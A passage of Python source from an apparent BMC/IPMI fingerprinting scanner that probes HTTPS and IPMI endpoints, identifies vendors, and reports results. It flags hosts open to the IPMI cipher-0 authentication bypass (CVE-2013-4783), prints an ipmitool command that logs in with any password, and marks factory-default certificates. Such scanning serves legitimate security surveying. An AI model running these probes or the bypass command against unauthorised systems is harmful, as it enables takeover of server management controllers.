                        out["cert_not_before"] = c.not_valid_before_utc.isoformat() if hasattr(c, "not_valid_before_utc") else c.not_valid_before.isoformat()
                        out["cert_not_after"]  = c.not_valid_after_utc.isoformat()  if hasattr(c, "not_valid_after_utc")  else c.not_valid_after.isoformat()
                        out["cert_sig_algo"]   = c.signature_hash_algorithm.name if c.signature_hash_algorithm else "unknown"
                        pk = c.public_key()
                        if isinstance(pk, rsa.RSAPublicKey):
                            out["cert_key"] = f"RSA-{pk.key_size}"
                        elif isinstance(pk, ec.EllipticCurvePublicKey):
                            out["cert_key"] = f"EC-{pk.curve.name}"
                        else:
                            out["cert_key"] = type(pk).__name__
                        # Self-signed = subject == issuer (factory cert hallmark)
                        out["cert_self_signed"] = c.subject == c.issuer
                        # Heuristic factory-default flag (used by verdict layer).
                        if (out["cert_self_signed"] and
                            out.get("cert_key") == "RSA-1024" and
                            out.get("cert_sig_algo") in ("sha1", "md5")):
                            out["cert_factory_default"] = True
                    except (ImportError, Exception):
                        pass
                # NB: do NOT request gzip — sending Accept-Encoding triggers
                # server compression which we'd then have to decompress.
                # We send no encoding header so server replies plaintext.
                req = (f"GET / HTTP/1.0\r\nHost: {host}\r\n"
                       f"Accept-Encoding: identity\r\n"
                       f"User-Agent: zipmi-fingerprint/1.0\r\n\r\n").encode()
                s.sendall(req)
                buf = b""
                while len(buf) < 16384:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
        head, _, body = buf.partition(b"\r\n\r\n")
        encoding = None
        for line in head.split(b"\r\n"):
            if line.lower().startswith(b"server:"):
                out["server"] = line.split(b":", 1)[1].strip().decode("latin-1")
            if line.lower().startswith(b"set-cookie:"):
                cookie_name = line.split(b":", 1)[1].split(b"=", 1)[0].strip().decode("latin-1")
                out.setdefault("cookies", []).append(cookie_name)
            if line.lower().startswith(b"location:"):
                out["location"] = line.split(b":", 1)[1].strip().decode("latin-1")
            if line.lower().startswith(b"content-encoding:"):
                encoding = line.split(b":", 1)[1].strip().lower()
        # Some servers ignore Accept-Encoding: identity and gzip anyway.
        if encoding in (b"gzip", b"deflate"):
            try:
                import gzip as _gz, zlib as _zl
                if encoding == b"gzip":
                    body = _gz.decompress(body)
                else:
                    body = _zl.decompress(body)
            except Exception:
                pass
        # title
        bl = body.lower()
        i = bl.find(b"<title")
        if i >= 0:
            j = bl.find(b">", i)
            k = bl.find(b"</title>", j)
            if 0 <= j < k:
                out["title"] = body[j + 1:k].strip().decode("utf-8", "replace")

        # Body scan for vendor markers — many BMC web UIs include large
        # copyright/legal banners as HTML comments at the top of the page
        # (AMI/Supermicro/Quanta especially). Check for vendor needles.
        body_text = body[:32768].decode("utf-8", "replace")
        body_lc   = body_text.lower()
        for needle, label in [
            ("american megatrends",       "American Megatrends Inc (AMI)"),
            ("megatrends",                "American Megatrends Inc (AMI)"),
            ("super micro",               "Supermicro"),
            ("supermicro",                "Supermicro"),
            ("hewlett packard",           "HPE"),
            ("hewlett-packard",           "HPE"),
            ("integrated lights-out",     "HPE iLO"),
            ("dell inc",                  "Dell"),
            ("dell remote",               "Dell iDRAC"),
            ("idrac",                     "Dell iDRAC"),
            ("ibm corporation",           "IBM"),
            ("lenovo",                    "Lenovo"),
            ("xclarity",                  "Lenovo XClarity"),
            ("fujitsu",                   "Fujitsu"),
            ("huawei",                    "Huawei"),
            ("xfusion",                   "xFusion"),
            ("cisco systems",             "Cisco"),
            ("asrock",                    "ASRockRack"),
            ("asustek",                   "ASUS"),
            ("quanta",                    "Quanta"),
            ("aspeed",                    "Aspeed (BMC SoC)"),
            ("nuvoton",                   "Nuvoton (BMC SoC)"),
        ]:
            if needle in body_lc:
                out.setdefault("body_vendors", []).append(label)
        # Dedup while preserving order.
        if "body_vendors" in out:
            seen = set(); uniq = []
            for v in out["body_vendors"]:
                if v not in seen: seen.add(v); uniq.append(v)
            out["body_vendors"] = uniq

        # Copyright year range — useful version hint. Match e.g. "2016-2017",
        # "(c) 2014-2018", "Copyright 2019 - 2021".
        import re as _re
        year_match = _re.search(
            r"(?:copyright|\(c\))\s*(?:&copy;)?\s*(\d{4})\s*[-–]\s*(\d{4})",
            body_lc,
        )
        if year_match:
            out["copyright"] = f"{year_match.group(1)}-{year_match.group(2)}"
        else:
            single = _re.search(r"(?:copyright|\(c\))\s*(?:&copy;)?\s*(\d{4})", body_lc)
            if single:
                out["copyright"] = single.group(1)

        # Favicon URL hint (vendors often serve unique favicons).
        fav = _re.search(r'<link[^>]+rel=["\'](?:shortcut )?icon["\'][^>]+href=["\']([^"\']+)', body_lc)
        if fav:
            out["favicon"] = fav.group(1)
            # Fetch favicon + hash. Each vendor ships a distinctive icon.
            # Hash → known-favicon table = single-shot vendor ID.
            fav_url = fav.group(1)
            if fav_url.startswith(("http://", "https://")):
                pass  # don't follow external URLs
            else:
                fav_path = "/" + fav_url.lstrip("./")
                try:
                    import hashlib
                    with socket.create_connection((host, 443), timeout=timeout) as raw2:
                        with ctx.wrap_socket(raw2, server_hostname=host) as s2:
                            s2.sendall(
                                f"GET {fav_path} HTTP/1.0\r\nHost: {host}\r\n"
                                f"User-Agent: zipmi-fingerprint/1.0\r\n\r\n".encode()
                            )
                            fbuf = b""
                            while len(fbuf) < 65536:
                                ch = s2.recv(4096)
                                if not ch: break
                                fbuf += ch
                    _, _, fbody = fbuf.partition(b"\r\n\r\n")
                    if fbody and len(fbody) > 16:
                        out["favicon_sha256"] = hashlib.sha256(fbody).hexdigest()[:16]
                        out["favicon_size"]   = len(fbody)
                except (OSError, ssl.SSLError):
                    pass

        return out
    except (OSError, ssl.SSLError, ConnectionResetError) as e:
        return {"error": f"{type(e).__name__}: {e}"}


# ──────────────────────── output ────────────────────────

def section(title: str) -> None:
    print(f"\n──── {title} ────")


def render_json(target, ac, did, guid, ciph, https, map_path,
                v15=None, v20=None, c0=None, redfish=None, kb=None) -> str:
    """Emit structured JSON: per-protocol sections + support flags + evidence + conclusion."""
    def _ok(d): return bool(d) and "error" not in d
    out = {"ip": target, "fqdn": ""}
    # Reverse DNS
    try:
        import socket as _s
        out["fqdn"] = _s.gethostbyaddr(target)[0]
    except Exception: pass

    # Get Channel Auth Caps
    out["gcac"] = {"support": _ok(ac)}
    if _ok(ac):
        iana = ac.get("oem_iana", 0)
        out["gcac"].update({
            "tuple":      ac.get("tuple"),
            "channel":    ac.get("channel"),
            "auth":       ac.get("auth"),
            "status":     ac.get("status"),
            "ext":        ac.get("ext"),
            "oem_iana":   iana,
            "oem_name":   IANA.get(iana, "unknown") if iana else None,
            "auth_bits":   decode_auth_bits(ac.get("auth", 0)),
            "status_bits": decode_status_bits(ac.get("status", 0)),
            "ext_bits":    decode_ext_bits(ac.get("ext", 0)),
        })
        entry = lookup_vendor(ac["tuple"], map_path)
        if entry:
            out["gcac"]["fleet_vendor"]    = entry.get("vendor")
            out["gcac"]["fleet_confidence"] = entry.get("confidence")
            out["gcac"]["fleet_cluster"]    = entry.get("cluster_size")
    elif ac:
        out["gcac"]["error"] = ac.get("error")

    # Get Device ID
    out["gdID"] = {"support": _ok(did)}
    if _ok(did):
        m = did.get("manufacturer", 0)
        out["gdID"].update({
            "manufacturer_id":   m,
            "manufacturer_name": IANA.get(m, "unknown"),
            "product_id":        did.get("product_id"),
            "bmc_generation":    guess_bmc_generation(m, did.get("product_id", 0)),
            "fw_revision":       did.get("fw_rev"),
            "ipmi_version":      f"{did.get('ipmi_version', 0) & 0x0F}.{(did.get('ipmi_version', 0) >> 4) & 0x0F}",
            "device_id":         did.get("device_id"),
            "aux_fw_rev":        did.get("aux_fw_rev"),
        })
    elif did:
        out["gdID"]["error"] = did.get("error")

    # Get System GUID
    out["guid"] = {"support": _ok(guid)}
    if _ok(guid):
        out["guid"].update({
            "guid":        guid.get("guid_rfc"),
            "raw":         guid.get("guid_raw"),
            "pattern":     guid.get("pattern"),
            "pattern_note": guid.get("pattern_note"),
            "v1_mac":      guid.get("mac_v1"),
        })
    elif guid:
        out["guid"]["error"] = guid.get("error")

    # Cipher suites + cipher 0 active
    out["cs"] = {"support": _ok(ciph)}
    if _ok(ciph):
        out["cs"]["enumerated"] = ciph.get("cipher_list")
        out["cs"]["cipher0_advertised"] = ciph.get("cipher0", False)
    elif ciph:
        out["cs"]["error"] = ciph.get("error")
    if c0:
        out["cs"]["cipher0_open_session"] = c0.get("cipher0_accepted", False)
        out["cs"]["cipher0_exploitable"] = c0.get("cipher0_exploitable", False)
        if c0.get("cipher0_exploitable"):
            out["cs"]["cipher0_user"] = c0.get("user")
            out["cs"]["cipher0_bmc_sid"] = c0.get("bmc_sid")
        if c0.get("note"):
            out["cs"]["cipher0_note"] = c0["note"]

    # HTTPS :443
    out["https:443"] = {"support": _ok(https)}
    if _ok(https):
        for k in ("server", "title", "location", "cert_cn", "cert_issuer",
                  "cert_san", "cert_key", "cert_sig_algo", "cert_not_before",
                  "cert_not_after", "cert_self_signed", "cert_factory_default",
                  "cert_sha256", "cert_pem", "cookies", "body_vendors",
                  "copyright", "favicon", "favicon_sha256"):
            if k in https:
                out["https:443"][k] = https[k]
    elif https:
        out["https:443"]["error"] = https.get("error")

    # Redfish
    out["redfish"] = {"support": _ok(redfish)}
    if _ok(redfish):
        for k in ("Vendor", "Manufacturer", "Product", "RedfishVersion", "Name", "Oem_keys"):
            if k in redfish:
                out["redfish"][k] = redfish[k]
    elif redfish:
        out["redfish"]["error"] = redfish.get("error")

    # IPMI version support
    out["ipmi"] = {"support": _ok(ac), "advertised": detect_ipmi_versions(ac, did)}
    if v15:
        out["ipmi"]["active_1.5"] = v15.get("active", False)
        if v15.get("comp_code") is not None:
            out["ipmi"]["v1.5_comp_code"] = v15.get("comp_code")
            out["ipmi"]["v1.5_comp_name"] = v15.get("comp_name")
    if v20:
        out["ipmi"]["active_2.0"] = v20.get("active", False)
        if v20.get("bmc_sid"):
            out["ipmi"]["v2.0_bmc_sid"] = v20["bmc_sid"]

    # AMT (skipped — not probed by default in this build)
    out["amt"] = {"support": False, "note": "not probed (orthogonal corpus)"}

    # Probes overview
    out["probes"] = {
        "auth_caps":   _ok(ac),
        "device_id":   _ok(did),
        "system_guid": _ok(guid),
        "ciphers":     _ok(ciph),
        "cipher0_active": _ok(c0) if c0 else False,
        "ipmi1_5_active": v15.get("active", False) if v15 else False,
        "ipmi2_0_active": v20.get("active", False) if v20 else False,
        "https_443":   _ok(https),
        "redfish":     _ok(redfish),
    }

    # Evidence (signals)
    signals = _collect_signals(ac, did, guid, ciph, https, map_path, redfish, kb)
    out["evidence"] = [
        {"src": s[0], "label": s[1], "confidence": s[2]} for s in signals
    ]

    # Conclusion / final
    hard = [s for s in signals if s[0] in ("https", "https_body", "device_id",
                                            "guid_fmt", "redfish")]
    soft = [s for s in signals if s[0] == "tuple"]
    conclusion = {"final": None, "vendor": None, "firmware_version": None}
    if hard:
        top = max(hard, key=lambda s: s[2])
        conclusion["final"]  = top[1]
        conclusion["vendor"] = top[1].split()[0]   # crude — first word
        conclusion["primary_signal"] = top[0]
        conclusion["primary_confidence"] = top[2]
    elif soft:
        conclusion["final"]  = soft[0][1]
        conclusion["vendor"] = soft[0][1].split()[0]
        conclusion["primary_signal"] = "tuple"
        conclusion["primary_confidence"] = soft[0][2]
    if did and _ok(did):
        conclusion["firmware_version"] = did.get("fw_rev")
    if redfish and _ok(redfish):
        if redfish.get("Product"):
            conclusion["product"] = redfish["Product"]
        if redfish.get("RedfishVersion"):
            conclusion["redfish_version"] = redfish["RedfishVersion"]
    out["conclusion"] = conclusion

    return out


def render_json_single(target, ac, did, guid, ciph, https, map_path,
                       v15=None, v20=None, c0=None, redfish=None, kb=None) -> str:
    """Wrap a single target's dict as full {"targets": {...}} JSON document."""
    inner = render_json(target, ac, did, guid, ciph, https, map_path,
                         v15=v15, v20=v20, c0=c0, redfish=redfish, kb=kb)
    return json.dumps({"targets": {target: inner}}, default=str, indent=2)


def _render_quiet(target, ac, did, guid, ciph, https, map_path, do_https,
                  redfish=None, kb=None):
    """Single-line per host. Picks the strongest hard signal as the verdict."""
    signals = _collect_signals(ac, did, guid, ciph, https, map_path, redfish, kb)
    hard = [s for s in signals if s[0] in ("https", "https_body", "device_id", "guid_fmt")]
    soft = [s for s in signals if s[0] == "tuple"]
    if hard:
        top = max(hard, key=lambda s: s[2])
        print(f"{target}\t{top[1]}\t{fmt_conf(top[2])}\t{top[0]}")
    elif soft:
        top = soft[0]
        print(f"{target}\t{top[1]}\t{fmt_conf(top[2])}\ttuple-only")
    else:
        print(f"{target}\tno-signal\t-\t-")


def _collect_signals(ac, did, guid, ciph, https, map_path, redfish=None, kb=None):
    """Shared by verbose + quiet renderers."""
    signals = []
    if ac and "error" not in ac:
        entry = lookup_vendor(ac["tuple"], map_path)
        if entry:
            signals.append(("tuple", entry["vendor"], entry.get("confidence", 0)))
    if did and "error" not in did:
        m = did["manufacturer"]
        gen = guess_bmc_generation(m, did["product_id"])
        if gen != "unknown":
            signals.append(("device_id", gen, 1.0))
        elif m and IANA.get(m):
            signals.append(("device_id", IANA[m], 0.70))
    if guid and "error" not in guid:
        pat = guid.get("pattern")
        if pat == "dell_smbios":
            signals.append(("guid_fmt", "Dell iDRAC", 0.99))
        elif pat == "ascii_prefix_zero_pad":
            signals.append(("guid_fmt", "AMI codebase (Supermicro/ASRockRack/ASUS/generic)", 0.92))
        elif pat == "all_ascii":
            signals.append(("guid_fmt", "HPE iLO", 0.85))
        elif pat == "rfc4122_v1":
            signals.append(("guid_fmt", "Lenovo XClarity (proper v1 UUID)", 0.60))
    if https and "error" not in https:
        # Body vendor markers carry strong signal (HTML comments w/ legal text).
        for v in (https.get("body_vendors") or []):
            signals.append(("https_body", v, 0.97))
        # Factory-default cert: heuristic from cert_self_signed + RSA-1024 + SHA1.
        if https.get("cert_factory_default"):
            signals.append(("cert_factory", "FACTORY-DEFAULT cert (fleet-shared key)", 0.99))
        # Cert + Server header + title + cookies + location.
        blob = " ".join(filter(None, [
            https.get("server"), https.get("title"),
            https.get("cert_cn"), https.get("cert_issuer"),
            https.get("cert_san"), https.get("location"),
        ])).lower()
        blob_ns = blob.replace(" ", "")
        for needles, label in [
            (("supermicro", "supermicrocomputer"), "Supermicro"),
            (("asrockrack",),                     "ASRockRack"),
            (("idrac",),                          "Dell iDRAC"),
            (("hp-ilo", "iloweb", "hewlettpackard", "ilo "), "HPE iLO"),
            (("xclarity",),                       "Lenovo XClarity"),
            (("irmc", "fujitsu", "serverview"),   "Fujitsu iRMC"),
            (("ibmc", "huawei", "xfusion"),       "Huawei iBMC"),
            (("cimc", "ciscointegrated"),         "Cisco CIMC"),
            (("megarac",),                        "AMI MegaRAC"),
            (("mbedthis", "appweb"),              "iDRAC6/IMM2 (Mbedthis-Appweb)"),
            (("goahead",),                        "GoAhead-Webs (legacy)"),
            (("asmb9",),                          "ASUS ASMB9"),
        ]:
            if any(n in blob or n in blob_ns for n in needles):
                signals.append(("https", label, 0.95))
                break

    # --- KB signals — cookies, form fields, Server header substrings ---
    if kb and https and "error" not in https:
        # Cookie names → vendor (e.g., ORA_ILOM_LOGIN → Oracle ILOM)
        for ck in (https.get("cookies") or []):
            if ck in kb.get("cookies", {}):
                rec = kb["cookies"][ck]
                signals.append(("kb_cookie", f"{rec['vendor']} (cookie '{ck}')",
                                round(rec.get("purity", 0.85), 2)))
        # Server header substring
        srv = (https.get("server") or "").strip()
        if srv:
            sk = kb.get("server_headers", {})
            if srv in sk:
                rec = sk[srv]
                signals.append(("kb_server", f"{rec['vendor']} (Server: {srv})",
                                round(rec.get("purity", 0.85), 2)))

    # --- Redfish ServiceRoot vendor signal ---
    if redfish and "error" not in redfish:
        v = redfish.get("Vendor") or redfish.get("Manufacturer")
        if v:
            signals.append(("redfish", v, 0.99))

    return signals


def detect_ipmi_versions(ac: dict | None, did: dict | None) -> list[str]:
    """Cross-check IPMI version support from BOTH Auth-Caps and Device-ID.

    - Auth-Caps `ext_caps` byte: bit0=IPMI1.5, bit1=IPMI2.0  (what the
      LAN channel advertises sessionless).
    - Auth-Caps `auth_type_support` byte: bit7=IPMI2.0-ext present  (a
      separate v2.0 indication; some BMCs advertise here but not in ext).
    - Device-ID `ipmi_version` byte (low-nibble = major, high-nibble = minor):
      0x51 = 1.5, 0x02 = 2.0 (BCD swapped per spec).

    Note: there is NO IPMI 1.0 LAN — IPMI 1.0 predates the RMCP/LAN spec
    and existed only on local interfaces (KCS/SMIC). A BMC reachable on
    UDP/623 is at minimum 1.5. We still report '1.0_local_only' for
    completeness if the spec ever allowed it (it doesn't).
    """
    versions = set()
    if ac and "error" not in ac:
        ext = ac.get("ext", 0)
        auth = ac.get("auth", 0)
        if ext & 0x01:  versions.add("1.5")
        if ext & 0x02:  versions.add("2.0")
        if auth & 0x80: versions.add("2.0")  # IPMI2.0_ext flag
    if did and "error" not in did:
        v = did.get("ipmi_version", 0)
        if v == 0x51:  versions.add("1.5")
        elif v == 0x02: versions.add("2.0")
    return sorted(versions)


def conf_label(c: float) -> str:
    """Bucket a 0..1 confidence into strong/likely/mixed/weak.

    Thresholds derived from the 40,097-host fleet distribution:
       strong (>=90%)   32% of hosts — single-vendor cluster, no real overlap
       likely (70-90%)  58% of hosts — dominant vendor + minor sub-vendors
       mixed  (50-70%)   9% of hosts — real OEM overlap (AMI rebrand zone)
       weak   (<50%)   1.6% of hosts — multi-vendor / evidence-poor cluster
    """
    if c >= 0.90: return "strong"
    if c >= 0.70: return "likely"
    if c >= 0.50: return "mixed"
    return "weak"


VENDOR_SYNONYMS = [
    {"ami", "megarac", "megatrends", "american"},
    {"dell", "idrac", "drac"},
    {"hpe", "ilo", "hp", "hewlett", "packard"},
    {"lenovo", "xclarity", "xcc"},
    {"ibm", "imm", "imm2"},
    {"fujitsu", "irmc", "serverview"},
    {"huawei", "ibmc", "xfusion"},
    {"cisco", "cimc"},
    {"supermicro", "smc"},
    {"asrockrack", "asrock"},
    {"asus", "asmb9"},
    {"goahead", "embedthis", "appweb", "mbedthis"},
]


def _vendor_family(label: str) -> set[str] | None:
    """Map vendor label to its synonym family set (returns the matching set)."""
    tokens = {t.lower().rstrip(",.()") for t in label.split()}
    tokens |= {t.lower() for t in label.replace("/", " ").split()}
    for fam in VENDOR_SYNONYMS:
        if tokens & fam:
            return fam
    return None


def same_vendor(a: str, b: str) -> bool:
    """True if two free-form vendor labels refer to the same vendor family.
    Used to merge e.g. 'AMI MegaRAC' and 'American Megatrends Inc (AMI)'.
    """
    fa, fb = _vendor_family(a), _vendor_family(b)
    if fa is None or fb is None:
        return a.lower() == b.lower()
    return fa is fb


def fmt_conf(c: float | int | str | None) -> str:
    """Render a 0..1 ratio as 'NN% (label)'. Pass-through for non-numbers."""
    try:
        f = float(c)
    except (TypeError, ValueError):
        return str(c)
    return f"{int(round(f * 100))}% ({conf_label(f)})"


def _resolve_target(target: str) -> str:
    """Return 'ip/fqdn' if both resolve, else just the input. Silent on failure."""
    ip = fqdn = None
    try:
        ipaddress.ip_address(target)
        ip = target
        vlog(f"resolver: input is IP {ip}, attempting reverse DNS (PTR)")
        try:
            fqdn = socket.gethostbyaddr(target)[0]
            vlog(f"resolver: PTR → {fqdn}")
        except (socket.herror, socket.gaierror, OSError) as e:
            vlog(f"resolver: PTR lookup failed ({e.__class__.__name__})")
    except ValueError:
        fqdn = target
        vlog(f"resolver: input is hostname {fqdn}, attempting forward DNS (A/AAAA)")
        try:
            ip = socket.gethostbyname(target)
            vlog(f"resolver: A → {ip}")
        except (socket.gaierror, OSError) as e:
            vlog(f"resolver: forward lookup failed ({e.__class__.__name__})")
    if ip and fqdn and ip != fqdn:
        return f"{ip}/{fqdn}"
    return ip or fqdn or target


def render(target: str, ac: dict | None, did: dict | None,
           guid: dict | None, ciph: dict | None, https: dict | None,
           map_path: Path, *, v15: dict | None = None, v20: dict | None = None,
           c0: dict | None = None, redfish: dict | None = None,
           kb: dict | None = None,
           do_https: bool = True, quiet: bool = False) -> None:
    """Print full structured report, OR a single CONSENSUS line if quiet."""
    if quiet:
        _render_quiet(target, ac, did, guid, ciph, https, map_path, do_https,
                      redfish=redfish, kb=kb)
        return
    print(f"target: {target}")

    # Auth Caps
    section("Get Channel Auth Caps")
    if not ac or "error" in (ac or {}):
        print(f"  ERR: {(ac or {}).get('error', 'no response')}")
    else:
        iana = ac["oem_iana"]
        vendor_iana = IANA.get(iana, "unknown") if iana else "—"
        print(f"  tuple        = {ac['tuple']}")
        print(f"  auth_bits    = {' | '.join(decode_auth_bits(ac['auth'])) or '(none)'}")
        print(f"  status_bits  = {' | '.join(decode_status_bits(ac['status'])) or '(none)'}")
        print(f"  ext_bits     = {' | '.join(decode_ext_bits(ac['ext'])) or '(none)'}")
        print(f"  oem_iana     = {iana} ({vendor_iana})")
        if iana == 0x005345:
            print(f"                 note: 0x005345 = ASCII 'ES' — AMI MegaRAC marker")
        elif iana == 0x00c1d6:
            print(f"                 note: 0x00c1d6 — ASRockRack OEM stamp")
        entry = lookup_vendor(ac["tuple"], map_path)
        if entry:
            print(f"  fleet vendor = {entry['vendor']} "
                  f"(conf={fmt_conf(entry.get('confidence'))}, "
                  f"cluster={entry.get('cluster_size', '?')} hosts)")
        else:
            print(f"  fleet vendor = (tuple not in {map_path.name})")

    # Device ID
    section("Get Device ID")
    if not did or "error" in (did or {}):
        print(f"  ERR: {(did or {}).get('error', 'no response')}")
    else:
        m = did["manufacturer"]
        m_name = IANA.get(m, "unknown")
        gen = guess_bmc_generation(m, did["product_id"])
        ipmi_ver_byte = did["ipmi_version"]
        # Spec: low nibble = major, high nibble = minor (BCD swapped).
        ipmi_ver_str = f"{ipmi_ver_byte & 0x0F}.{(ipmi_ver_byte >> 4) & 0x0F}"
        print(f"  manufacturer = {m} ({m_name})")
        print(f"  product_id   = 0x{did['product_id']:04x}  → {gen}")
        print(f"  fw_revision  = {did['fw_rev']}")
        print(f"  ipmi_version = {ipmi_ver_str}  (raw 0x{ipmi_ver_byte:02x})")
        print(f"  device_id    = 0x{did['device_id']:02x}  rev=0x{did['device_rev']:02x}")
        if did["aux_fw_rev"] and did["aux_fw_rev"] != "00000000":
            print(f"  aux_fw_rev   = {did['aux_fw_rev']}")

    # System GUID
    section("Get System GUID")
    if not guid or "error" in (guid or {}):
        print(f"  ERR: {(guid or {}).get('error', 'no response')}")
    else:
        print(f"  guid         = {guid['guid_rfc']}")
        print(f"  guid_raw     = {guid['guid_raw']}")
        print(f"  pattern      = {guid['pattern']}")
        print(f"                 {guid['pattern_note']}")
        if guid.get("mac_v1"):
            oui = guid["mac_v1"][:8]
            print(f"  mac (v1)     = {guid['mac_v1']}  (OUI {oui})")

    # Cipher Suites + active cipher-0 acceptance probe
    section("Cipher suites + cipher-0 active test")
    if not ciph or "error" in (ciph or {}):
        print(f"  enumerated   = ERR: {(ciph or {}).get('error', 'no response')}")
    else:
        cl = ciph["cipher_list"]
        print(f"  enumerated   = {cl}  (advertised by Cmd 0x54)")
        if ciph["cipher0"]:
            print(f"                 ⚠ list contains 0 — cipher-0 ADVERTISED")
    if c0 is not None:
        if c0.get("cipher0_exploitable"):
            print(f"  active probe = ⚠⚠⚠ EXPLOITABLE — CVE-2013-4783 confirmed (full RAKP cycle)")
            print(f"                 user='{c0.get('user')}'  bmc_sid={c0.get('bmc_sid','?')}")
            print(f"                 RAKP-4 status=0x00 → session ACTIVE with NULL HMAC (any password)")
            print(f"                 verify: ipmitool -I lanplus -C 0 -H {target} \\")
            print(f"                            -U {c0.get('user')} -P anything chassis status")
        elif c0.get("cipher0_accepted"):
            print(f"  active probe = cipher 0 algo accepted at Open Session, RAKP failed")
            print(f"                 {c0.get('note','?')}")
        elif "error" in c0:
            print(f"  active probe = no RMCP+ reply — {c0['error']}")
        else:
            print(f"  active probe = cipher 0 refused — {c0.get('note','?')}")

    # HTTPS
    section("HTTPS :443")
    if not https or "error" in (https or {}):
        print(f"  {(https or {}).get('error', 'not probed')}")
    else:
        for k in ("server", "title", "cert_cn", "cert_issuer", "cert_san", "location"):
            if https.get(k):
                print(f"  {k:12s} = {https[k]}")
        if https.get("cookies"):
            print(f"  cookies      = {','.join(https['cookies'])}")
            # Vendor-specific session cookie names.
            COOKIE_HINTS = {
                "_appwebSessionId_": "Mbedthis-Appweb (iDRAC6/IBM IMM2)",
                "tokenvalue":        "Mbedthis-Appweb session",
                "mPort_Web_Sessions_Identifier": "Supermicro WebUI",
                "SID":               "Supermicro / generic AMI",
                "JSESSIONID":        "Java app (IBM IMM2 / Lenovo XCC)",
                "JSESSIONIDSSO":     "Lenovo XCC",
                "iDRAC-cookie":      "Dell iDRAC9",
                "iDRAC6_cookie":     "Dell iDRAC6",
                "Cookie":            "(generic)",
                "QSESSIONID":        "Quanta BMC",
                "_iLO_session":      "HPE iLO",
                "wcid":              "HPE iLO",
                "phpMyAdminInsist":  "(red herring)",
            }
            for name in https["cookies"]:
                if name in COOKIE_HINTS:
                    print(f"               cookie '{name}' → {COOKIE_HINTS[name]}")
        if https.get("body_vendors"):
            print(f"  body_vendors = {', '.join(https['body_vendors'])}")
        if https.get("copyright"):
            print(f"  copyright    = {https['copyright']}  "
                  f"(rough firmware-era hint)")
        if https.get("favicon"):
            extra = ""
            if https.get("favicon_sha256"):
                extra = f"  sha256={https['favicon_sha256']}  size={https['favicon_size']}"
            print(f"  favicon      = {https['favicon']}{extra}")
        # Cert details (factory-default flag, validity, key, sig).
        for k, label in [
            ("cert_key",      "cert_key   "),
            ("cert_sig_algo", "cert_sig   "),
            ("cert_not_before", "cert_from  "),
            ("cert_not_after",  "cert_until "),
            ("cert_self_signed", "cert_self  "),
        ]:
            if k in https:
                print(f"  {label} = {https[k]}")
        if https.get("cert_factory_default"):
            print(f"  ⚠ FACTORY DEFAULT CERT — fleet-shared private key likely "
                  f"(see ~/.claude/.../reference_idrac6_factory_cert.md)")

    # Redfish ServiceRoot
    section("Redfish /redfish/v1/")
    if not redfish:
        print("  (probe disabled)")
    elif "error" in redfish:
        print(f"  ERR: {redfish['error']}")
    else:
        for k in ("Vendor", "Manufacturer", "Product", "RedfishVersion", "Name"):
            if k in redfish:
                print(f"  {k:18s} = {redfish[k]}")
        if redfish.get("Oem_keys"):
            print(f"  Oem_keys           = {', '.join(redfish['Oem_keys'])}")

    # Overview — which probes the BMC actually answered.
    # Per IPMI 2.0 table 22-1: only Auth-Caps + Cipher-Suites are spec'd
    # sessionless. Permissive BMCs (AMI, some Supermicro) also answer
    # Device-ID + System-GUID without auth; strict BMCs (Dell iDRAC, HPE
    # iLO, Cisco CIMC, Lenovo XCC) refuse → timeout. So a timeout pattern
    # *is* a fingerprint.
    section("overview — which probes answered")
    behavior = {
        "auth_caps":     bool(ac    and "error" not in ac),
        "device_id":     bool(did   and "error" not in did),
        "system_guid":   bool(guid  and "error" not in guid),
        "ciphers":       bool(ciph  and "error" not in ciph),
        "ipmi1.5_active": bool(v15  and v15.get("active")),
        "ipmi2.0_active": bool(v20  and v20.get("active")),
        "https_443":     bool(https and "error" not in https),
    }
    for k, v in behavior.items():
        if k == "https_443" and not do_https:
            print(f"  {k:12s} = (skipped via --no-https)")
        else:
            print(f"  {k:12s} = {'OK' if v else 'refused/timeout'}")
    # Class hint from spec-violation probes only.
    # Auth-Caps + Cipher-Suites + active version probes are spec-mandated
    # sessionless — every BMC answers, so they don't differentiate.
    # Device-ID + System-GUID are spec-restricted; permissive BMCs (AMI/
    # Supermicro) ignore the spec and answer sessionless, strict BMCs
    # (Dell/HPE/Cisco/Lenovo) refuse → timeout.
    spec_violations = sum(1 for k in ("device_id", "system_guid") if behavior[k])
    if spec_violations >= 2:
        print(f"  → permissive BMC (AMI/Supermicro family typical)")
    elif behavior["auth_caps"] and spec_violations == 0:
        print(f"  → strict BMC (enterprise: Dell/HPE/Cisco/Lenovo typical)")

    # IPMI version support
    versions = detect_ipmi_versions(ac, did)
    section("IPMI version support")
    if not versions:
        print("  (no version info — auth_caps did not decode)")
    else:
        print(f"  advertised   = {', '.join(versions)}  "
              f"(IPMI 1.0 is local-bus only; any LAN BMC is ≥1.5)")
    if v15 is not None:
        if v15.get("active"):
            print(f"  active 1.5   = OK  (Get-Session-Challenge → "
                  f"0x{v15['comp_code']:02x}: {v15['comp_name']})")
        else:
            print(f"  active 1.5   = no  ({v15.get('error', '?')})")
    if v20 is not None:
        if v20.get("active"):
            extra = v20.get("open_status_name") or v20.get("note", "")
            sid = v20.get("bmc_sid", "")
            print(f"  active 2.0   = OK  RMCP+ {extra}  bmc_sid={sid}")
        else:
            print(f"  active 2.0   = no  ({v20.get('error', '?')})")

    # Collect signals + behavior tag.
    signals = _collect_signals(ac, did, guid, ciph, https, map_path, redfish, kb)
    spec_violations = sum(1 for k in ("device_id", "system_guid") if behavior[k])
    if behavior["auth_caps"] and spec_violations == 0:
        signals.append(("behavior", "strict BMC (enterprise: Dell/HPE/Cisco/Lenovo)", 0.55))
    elif spec_violations >= 2:
        signals.append(("behavior", "permissive BMC (AMI/Supermicro family)", 0.55))

    # Evidence — every signal we collected, in order seen.
    section("evidence — every fingerprint signal we got")
    if not signals:
        print("  no signals — host did not answer any probe")
    else:
        for src, lab, conf in signals:
            print(f"  [{src:11s}] → {lab}  conf {fmt_conf(conf)}")

    # Verdict — bucket key, signal analysis, then FINAL at the very bottom.
    section("verdict — signal analysis")
    print("  Confidence buckets (76 tuples covering 40,097 classified hosts in survey):")
    print("    strong (≥90%)    32.3% of hosts — single-vendor cluster, no overlap")
    print("    likely (70-90%)  57.5% of hosts — dominant vendor + minor sub-vendors")
    print("    mixed  (50-70%)   8.7% of hosts — real OEM overlap (AMI rebrand zone)")
    print("    weak   (<50%)     1.6% of hosts — multi-vendor / evidence-poor")
    print()

    final_label  = None
    final_detail = []

    if not signals:
